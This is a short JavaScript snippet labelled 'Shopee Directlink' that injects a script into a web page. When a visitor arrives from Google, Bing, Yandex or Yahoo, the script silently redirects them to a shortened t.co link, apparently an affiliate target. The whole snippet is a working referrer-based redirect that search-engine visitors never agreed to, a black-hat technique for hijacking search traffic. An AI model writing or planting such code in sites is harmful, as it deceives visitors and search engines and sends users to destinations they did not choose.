// ---- Shopee Directlink
(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\n//<![CDATA[\n//--- setting ---------\nvar refererWeb=[\n  \"www.google.com\",\n  \"www.bing.com\",\n  \"yandex.com\",\n  \"yahoo.com\",\n  \"www.google.co.id\"\n];\nvar directTo=\"https://t.co/kYWKJ5gbiF\";\n\n\n//--- main script ---------\nif(document.referrer){\n  var aaRef = document.referrer;\n  refererWeb.forEach(function(a){\n   if(aaRef.indexOf(a)>=0){\n\twindow.location.href=directTo;\n   };\n  });\n};\n//]]>\n"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
